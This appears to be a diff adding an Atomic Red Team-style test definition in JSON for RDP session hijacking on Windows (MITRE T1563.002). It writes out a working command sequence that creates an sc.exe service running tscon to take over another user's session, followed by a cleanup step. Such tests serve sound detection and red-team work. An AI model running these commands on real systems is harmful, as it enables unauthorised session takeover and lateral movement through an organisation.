@@ -1,0 +1,58 @@
+{
+  "id": "a37ac520-b911-458e-8aed-c5f1576d9f46",
+  "name": "RDP hijacking",
+  "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "92f2eb6d-3fa7-48e0-9ee2-07d69e72896d",
+      "type": "execute-command",
+      "data": {
+        "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "13da3906-2bbe-4036-9a32-31e06eb3253b",
+      "type": "execute-command",
+      "data": {
+        "command": "sc.exe delete sesshijack \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "92f2eb6d-3fa7-48e0-9ee2-07d69e72896d",
+      "p": "on-success",
+      "o": "13da3906-2bbe-4036-9a32-31e06eb3253b"
+    },
+    {
+      "s": "92f2eb6d-3fa7-48e0-9ee2-07d69e72896d",
+      "p": "on-failure",
+      "o": "13da3906-2bbe-4036-9a32-31e06eb3253b"
+    }
+  ],
+  "tags": [
+    "T1563.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "Session_ID",
+      "type": "string",
+      "description": "The ID of the session to which you want to connect",
+      "value": "1337"
+    },
+    {
+      "name": "Destination_ID",
+      "type": "string",
+      "description": "Connect the session of another user to a different session",
+      "value": "rdp-tcp#55"
+    }
+  ]
+}
